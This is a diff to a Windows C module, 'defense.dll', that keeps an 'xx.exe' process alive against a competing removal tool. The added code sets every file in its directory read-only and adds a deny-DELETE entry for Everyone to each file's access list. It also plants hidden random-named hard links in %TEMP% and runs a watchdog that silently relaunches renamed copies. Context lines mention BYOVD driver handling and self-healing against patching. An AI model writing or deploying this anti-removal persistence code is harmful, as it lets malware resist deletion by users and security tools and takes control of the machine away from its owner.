@@ -1,4 +1,4 @@
-/*
+﻿/*
  * defense.dll - xx 合并防御模块
  *
  * 合并内容：
@@ -18,6 +18,9 @@
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
+#include <aclapi.h>
+#include <accctrl.h>
+#include <sddl.h>
 #include <winternl.h>
 #include <tlhelp32.h>
 #include <psapi.h>
@@ -25,9 +28,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdarg.h>
 
 /* ---- 共享内存布局 / 命名常量：唯一来源见 xxipc.h ---- */
 #include "xxipc.h"
+
+/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
+__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
 
 #define XX_EXE_NAME       XX_EXE_NAME_W
 #define XX_BACKUP_NAME    XX_BACKUP_NAME_W
@@ -49,6 +56,29 @@ const WCHAR *g_byovd[] = {
 
 #define MAX_LOCKS 32
 
+/* 本地日志：统一走 XXFileLog（UTF-16LE 追加到 %TEMP%\xx_debug.log）。
+   **必须是函数，不能是宏**：原来那版宏把 `[defense][pid=%lu]` 写死在格式串最前面、
+   却把 GetCurrentProcessId() 拼在可变参数列表的**末尾**，于是调用方传的第一个实参
+   被 `%lu` 当成 pid 吃掉，后面 `%ls` 又把 pid 这个整数当指针去解引用 ——
+   日志要么是乱码，要么直接在 xx.exe 里触发访问违例（被 FatalFilter 吞成"自己退出"）。
+   现在 pid 由函数自己填，调用方只负责正文的格式与实参。 */
+static void WriteDefLog(const WCHAR *fmt, ...) {
+    WCHAR body[256];
+    WCHAR line[320];
+    va_list args;
+
+    if (!fmt) return;
+    va_start(args, fmt);
+    _vsnwprintf(body, _countof(body) - 1, fmt, args);
+    va_end(args);
+    body[_countof(body) - 1] = L'\0';
+
+    _snwprintf(line, _countof(line) - 1, L"[defense][pid=%lu] %s\r\n",
+               GetCurrentProcessId(), body);
+    line[_countof(line) - 1] = L'\0';
+    XXFileLog(line);
+}
+
 CRITICAL_SECTION g_cs;
 BOOL      g_csInit   = FALSE;
 BOOL      g_defInit  = FALSE;
@@ -58,8 +88,13 @@ WCHAR     g_szSelfPath[MAX_PATH] = L"";   /* 自身 dll 全路径（摘链前缓
 ULONGLONG g_dwNameToken = 0;           /* 会话随机名 token（64 位）：由 xx.exe 同进程调用送进来 */
 
 static ULONGLONG NameTok(void) {
+    ULONGLONG s;
     if (g_dwNameToken) return g_dwNameToken;
-    return XX_NAME_TOKEN_FIXED;               /* defense 只跑在 xx 内，拿不到就退回固定值 */
+    /* 与其它模块同一套回退顺序：共享内存里的 64 位回退 token → 固定值。
+       复活互斥体（XX_PURPOSE_RESPAWN）要和 svcguard 撞上同一把锁，就不能只用固定值。 */
+    s = XXSharedToken64Now();
+    if (s) return s;
+    return XX_NAME_TOKEN_FIXED;
 }
 
 /* 远程导出：接收会话随机名（方案 A；defense 由 xx 同进程调用） */
@@ -273,7 +308,7 @@ DWORD WINAPI ShieldThread(LPVOID lp) {
    程序照常执行、不报异常，VEH 一点机会都没有 —— 只能靠定期与冷镜像逐字节比对，
    发现任何差异就整体写回。这样 0x90、0xCC 以及任意字节改写都能自愈。
    比对成本 = 一次 memcmp（几十 KB），200ms 一次可以忽略。 */
-#define TEXT_SCAN_MS 200
+#define TEXT_SCAN_MS 40
 
 DWORD WINAPI TextIntegrityThread(LPVOID lp) {
     UNREFERENCED_PARAMETER(lp);
@@ -317,6 +352,99 @@ static void BuildOwnPath(LPCWSTR name, WCHAR *out, SIZE_T cch) {
    共享模式必须是 FILE_SHARE_READ 而不是 0：实测（Windows）用 share=0 打开
    正在运行的镜像会直接 SHARING_VIOLATION（加载器自己持着读句柄），
    留出 READ 之后既能成功持锁，又能挡住删除 / 改名 / 覆盖写入。 */
+/* ================== C1 + C2：让 yy 删不掉我们的文件 ==================
+   yy 的 HunterWorker 在杀掉 xx.exe 之后会 DeleteFileW(xx.exe / xxres.bin /
+   黑名单 dll)，并 LockDownMaliciousFileNodes()。三层防线（本轮新增 C1/C2）：
+     C1-a 只读属性：FILE_ATTRIBUTE_READONLY —— DeleteFileW 对只读文件直接失败；
+     C1-b DACL 拒绝 DELETE：给文件安全描述符加一条 deny Everyone 的 DELETE
+          （我们是所有者，有 WRITE_DAC，可以改）；比共享锁更硬；
+     C1-c 一直持有 access=0 + FILE_SHARE_READ 句柄（原有 LockEnemyFiles 已做）；
+     C2   硬链接冗余：同一 inode 在 %TEMP% 下挂几条随机名硬链接，
+          它按名字删只能删掉它知道的那几个名字。
+   注意：只读属性会让我们自己的 CopyFileW 覆盖失败，所以**只在备份做好之后**再置。 */
+static BOOL DenyDeleteAcl(LPCWSTR path) {
+    PACL pOld = NULL, pNew = NULL;
+    PSECURITY_DESCRIPTOR pSD = NULL;
+    EXPLICIT_ACCESSW ea;
+    BOOL ok = FALSE;
+    SID_IDENTIFIER_AUTHORITY world = SECURITY_WORLD_SID_AUTHORITY;
+    PSID pEveryone = NULL;
+
+    if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryone))
+        return FALSE;
+
+    if (GetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
+                              NULL, NULL, &pOld, NULL, &pSD) != ERROR_SUCCESS) {
+        FreeSid(pEveryone);
+        return FALSE;
+    }
+
+    ZeroMemory(&ea, sizeof(ea));
+    ea.grfAccessPermissions = DELETE;
+    ea.grfAccessMode = DENY_ACCESS;
+    ea.grfInheritance = NO_INHERITANCE;
+    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea.Trustee.ptstrName = (LPWSTR)pEveryone;
+
+    if (SetEntriesInAclW(1, &ea, pOld, &pNew) == ERROR_SUCCESS) {
+        ok = (SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
+                                    NULL, NULL, pNew, NULL) == ERROR_SUCCESS);
+    }
+    if (pNew) LocalFree(pNew);
+    if (pSD) LocalFree(pSD);
+    FreeSid(pEveryone);
+    return ok;
+}
+
+/* 64 位随机（RtlGenRandom，Win7 自带；失败返回 FALSE） */
+static BOOL XXRand64Local(ULONGLONG *pOut) {
+    typedef BOOLEAN (NTAPI *RtlGenRandom_t)(PVOID, ULONG);
+    static RtlGenRandom_t s_pFn = NULL;
+    static BOOL s_bTried = FALSE;
+    if (!pOut) return FALSE;
+    if (!s_bTried) {
+        HMODULE h = GetModuleHandleW(L"advapi32.dll");
+        s_bTried = TRUE;
+        if (!h) h = LoadLibraryW(L"advapi32.dll");
+        if (h) s_pFn = (RtlGenRandom_t)GetProcAddress(h, "SystemFunction036");
+    }
+    if (!s_pFn) return FALSE;
+    return s_pFn(pOut, (ULONG)sizeof(*pOut)) ? TRUE : FALSE;
+}
+
+/* 把某个文件护起来：只读属性 + 拒 DELETE 的 DACL + 若干条随机名硬链接 */
+static void ArmorFile(LPCWSTR path, int nLinks, BOOL bDenyDelete) {
+    DWORD attr;
+    WCHAR tmp[MAX_PATH], link[MAX_PATH];
+    ULONGLONG rnd = 0;
+    int i;
+
+    if (!path || !path[0]) return;
+    attr = GetFileAttributesW(path);
+    if (attr == INVALID_FILE_ATTRIBUTES) return;
+
+    /* 只读属性（C1-a）：删 / 写都失败 */
+    if (!(attr & FILE_ATTRIBUTE_READONLY)) {
+        SetFileAttributesW(path, attr | FILE_ATTRIBUTE_READONLY);
+        WriteDefLog(L"C1-a 已置只读属性: %ls", path);
+    }
+    /* DACL 拒 DELETE（C1-b） */
+    if (DenyDeleteAcl(path))
+        WriteDefLog(L"C1-b 已加 deny-DELETE DACL: %ls", path);
+
+    /* 硬链接冗余（C2）：同一 inode，多挂几条随机名 */
+    if (nLinks <= 0) return;
+    if (!GetTempPathW(MAX_PATH, tmp)) return;
+    for (i = 0; i < nLinks; i++) {
+        if (!XXRand64Local(&rnd)) rnd = (ULONGLONG)GetTickCount() * 2654435761u + i;
+        swprintf_s(link, MAX_PATH, L"%lsxr%08lX_%02d.bin", tmp,
+                   (unsigned long)(rnd & 0xFFFFFFFFu), i);
+        if (CreateHardLinkW(link, path, NULL))
+            WriteDefLog(L"C2 已建硬链接: %ls -> %ls", link, path);
+    }
+}
+
 void LockEnemyFiles(void) {
     EnsureCs();
     EnterCriticalSection(&g_cs);
@@ -352,7 +480,42 @@ void ReleaseEnemyFiles(void) {
 
 DWORD WINAPI FileLockThread(LPVOID lp) {
     UNREFERENCED_PARAMETER(lp);
-    for (;;) { LockEnemyFiles(); Sleep(1000); }
+    for (;;) {
+        LockEnemyFiles();
+        /* C1/C2：把**程序目录下的所有文件**都护起来。
+           用户要求（针对 yy 的威胁 4/5）：目录下所有文件全部加保护 + 只读。
+           因为 yy.exe 的删除名单是硬编码的（svcguard/window/atkcore/payload/defense/
+           DeamonWindows/deamon 以及 xx.exe/xxres.bin），我们不可能每次都猜全；
+           干脆整目录护一遍，以后新加的模块（dedery.dll 之类）也自动覆盖。
+           做法：只读属性 + deny-DELETE 的 DACL + %TEMP% 下 1~2 条随机名硬链接；
+           xx.exe 多给 2 条硬链接（复活关键镜像）。 */
+        {
+            static BOOL s_bArmored = FALSE;
+            if (!s_bArmored && g_ownDir[0]) {
+                WCHAR pattern[MAX_PATH], path[MAX_PATH];
+                WIN32_FIND_DATAW fd;
+                HANDLE hFind;
+                int n = 0;
+
+                s_bArmored = TRUE;
+                swprintf_s(pattern, MAX_PATH, L"%ls\\*", g_ownDir);
+                hFind = FindFirstFileW(pattern, &fd);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        int nLinks = 1;
+                        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
+                        swprintf_s(path, MAX_PATH, L"%ls\\%ls", g_ownDir, fd.cFileName);
+                        if (_wcsicmp(fd.cFileName, XX_EXE_NAME) == 0) nLinks = 2;
+                        ArmorFile(path, nLinks, TRUE);
+                        n++;
+                    } while (FindNextFileW(hFind, &fd));
+                    FindClose(hFind);
+                }
+                WriteDefLog(L"C1 已把程序目录里 %d 个文件全部置只读 + deny-DELETE", n);
+            }
+        }        Sleep(40);
+    }
     return 0;
 }
 
@@ -364,15 +527,26 @@ void LockByovd(void) {
     }
 }
 
-/* ================== 心跳看门狗（xx 掉线则复活） ================== */
+/* ================== 心跳看门狗（xx 掉线则复活） ==================
+   判"还有没有别的我方实例在跑"：
+     1) **必须排除本进程**：defense.dll 本身就跑在 xx 里，算上自己这个判据永远为真，
+        "心跳掉了就再拉一份"的分支于是成了死代码；
+     2) 判据只用进程表，**不打开进程**（见 xxipc.h 的 XXSnapIsOurInstance）：
+        xx 的进程 DACL 把 Everyone 全拒，`XXPidIsOurXx`/`OpenProcess` 对它必然失败；
+        本体按镜像名认，改名的接管副本按"共享内存记录的那个实例 PID"认 ——
+        只按名字认 `svchost.exe` 会把系统真正的 svchost 当成我们（于是永不复活）。 */
 BOOL IsXxRunning(void) {
     HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (h == INVALID_HANDLE_VALUE) return FALSE;
+    DWORD known;
     PROCESSENTRY32W pe = { sizeof(pe) };
     BOOL found = FALSE;
+
+    if (h == INVALID_HANDLE_VALUE) return FALSE;
+    known = XXSharedInstancePid();
     if (Process32FirstW(h, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, XX_EXE_NAME) == 0) { found = TRUE; break; }
+            if (pe.th32ProcessID == GetCurrentProcessId()) continue;   /* 别把自己算成别人 */
+            if (XXSnapIsOurInstance(pe.szExeFile, pe.th32ProcessID, known)) { found = TRUE; break; }
         } while (Process32NextW(h, &pe));
     }
     CloseHandle(h);
@@ -380,23 +554,80 @@ BOOL IsXxRunning(void) {
 }
 
 void EnsureXxRunning(void) {
-    if (IsXxRunning()) return;
     WCHAR xx[MAX_PATH];
+    WCHAR target[MAX_PATH] = L"";
+    WCHAR szOnce[128];
+    HANDLE hOnce;
+    BOOL bResolved = FALSE;
+
+    if (IsXxRunning()) return;
+
+    /* 与 svcguard 共用同一把复活互斥体（`xx_rg_<token>`，见 xxipc.h 的 XX_PURPOSE_RESPAWN）：
+       上面那条判据修好之后 defense 真的会去拉实例了，两边都判定"要拉一份"时
+       必须只有一个人动手，否则心跳停摆期间会每秒各拉一份。拿不到说明别人正在拉，
+       本轮直接跳过（下一次心跳仍是停摆的话，节流到 1s 后还会再来）。 */
+    XXNamedObject(szOnce, _countof(szOnce), TRUE, XX_PURPOSE_RESPAWN, NameTok(), 0);
+    hOnce = CreateMutexW(NULL, FALSE, szOnce);
+    if (!hOnce) return;
+    {
+        DWORD w = WaitForSingleObject(hOnce, 0);
+        if (w != WAIT_OBJECT_0 && w != WAIT_ABANDONED) {
+            CloseHandle(hOnce);
+            return;
+        }
+    }
+
     swprintf_s(xx, MAX_PATH, L"%s" XX_EXE_NAME, g_ownDir);
     if (GetFileAttributesW(xx) == INVALID_FILE_ATTRIBUTES) {
         WCHAR bak[MAX_PATH];
         swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, g_ownDir);
-        if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES)
-            CopyFileW(bak, xx, FALSE);
+        if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
+            SetFileAttributesW(xx, FILE_ATTRIBUTE_NORMAL);      /* 只读会挡住 CopyFile，先清掉 */
+            SetFileAttributesW(bak, FILE_ATTRIBUTE_NORMAL);
+            if (CopyFileW(bak, xx, FALSE))
+                WriteDefLog(L"已从备份还原 xx.exe: %ls", xx);
+            else
+                WriteDefLog(L"从备份还原 xx.exe 失败 err=%lu", GetLastError());
+            SetFileAttributesW(bak, FILE_ATTRIBUTE_READONLY);   /* 还原完把只读加回去 */
+            SetFileAttributesW(xx, FILE_ATTRIBUTE_READONLY);
+        }
     }
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    if (CreateProcessW(xx, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, g_ownDir, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+
+    /* 复活目标不能写死成 <dir>\xx.exe：对手按名杀 xx.exe，接管副本早已改名到 %TEMP%。
+       XXRespawnTargetPath 会优先返回共享内存里记录的"最后完成初始化的实例"。 */
+    {
+        HANDLE hMap = XXOpenShared();
+        void *view = NULL;
+        if (hMap) {
+            view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
+            if (view && XX_LAYOUT(view) != XX_LAYOUT_VERSION) {
+                UnmapViewOfFile(view);
+                view = NULL;
+            }
+        }
+        bResolved = XXRespawnTargetPath(view, xx, target, MAX_PATH);
+        if (!bResolved)
+            WriteDefLog(L"EnsureXxRunning: 没有可复活的实例（xx.exe 与 xxres.bin 都不可用）");
+        if (view) UnmapViewOfFile(view);
+        if (hMap) CloseHandle(hMap);
     }
+
+    if (bResolved) {
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        if (CreateProcessW(target, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, g_ownDir, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            WriteDefLog(L"心跳看门狗已拉起实例: %ls", target);
+        } else {
+            WriteDefLog(L"心跳看门狗拉起失败: %ls err=%lu", target, GetLastError());
+        }
+    }
+
+    ReleaseMutex(hOnce);
+    CloseHandle(hOnce);
 }
 
 /* 心跳看门狗：判据是共享内存里的心跳计数器（window.dll 弹窗每 500ms 递增）。
@@ -425,7 +656,7 @@ DWORD WINAPI WatchdogThread(LPVOID lp) {
                     UnmapViewOfFile(v);
             }
         }
-        if (!pTick) Sleep(500);
+        if (!pTick) Sleep(40);
     }
 
     lastTick = *pTick;
@@ -495,7 +726,6 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
         GetModuleFileNameW(hinst, g_szSelfPath, MAX_PATH);
 
         /* 进程内单例：避免同一进程里被加载多份（重复装 hook / 重复起线程） */
-        XXWaitToken(&g_dwNameToken, 300);   /* xx 是同进程调用，几乎立即返回 */
         g_hSingleton = XXModuleSingleton(L"defense", NameTok());
         if (!g_hSingleton) return FALSE;
 
@@ -503,3 +733,13 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
     }
     return TRUE;
 }
+
+
+
+
+
+
+
+
+
+
